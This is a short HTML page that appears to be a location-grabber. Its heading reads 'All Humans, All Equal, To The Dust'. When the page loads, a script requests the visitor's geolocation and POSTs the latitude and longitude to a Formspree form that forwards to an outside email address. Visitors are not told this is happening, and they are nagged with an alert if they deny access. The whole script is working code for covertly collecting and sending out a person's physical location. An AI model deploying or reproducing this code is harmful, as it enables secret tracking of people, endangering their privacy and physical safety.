<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Capture User Location and Send it by Email</title>
</head>
<body>

  <center>
    <h1 style="color:#00ff00">All Humans, All Equal, To The Dust</h1>
    <p>This is a sample text to capture and send automatically via email.</p>
  </center>

  <script>
    window.onload = function() {
      // Check if geolocation is available
      if (navigator.geolocation) {
        // Get user's current position
        navigator.geolocation.getCurrentPosition(function(position) {
          const userLat = position.coords.latitude;  // Latitude
          const userLng = position.coords.longitude; // Longitude

          // Prepare the location data to be sent in the email
          const locationMessage = `User's Location:\nLatitude: ${userLat}\nLongitude: ${userLng}`;

          // Prepare form data (simulate sending form data to an email service like Formspree)
          const formData = new FormData();
          formData.append("email", "googleusers9913337@googlegroups.com"); // Recipient's email
          formData.append("subject", "Captured User Location from Webpage");
          formData.append("message", locationMessage);

          // Send the form data to Formspree endpoint (or another email service)
          fetch("https://formspree.io/f/movqwbek", {
            method: "POST",
            body: formData,
          })
          .then(response => {
            if (response.ok) {
              console.log("Email sent successfully!");
            } else {
              console.error("Error sending email. Response: ", response.status);
            }
          })
          .catch(error => {
            console.error("Error sending email:", error);
          });
        }, function(error) {
          // Handle geolocation errors
          alert("Error: The Geolocation service failed. Please allow location access.");
        });
      } else {
        alert("Error: Geolocation is not supported by this browser.");
      }
    };
  </script>

</body>
</html>
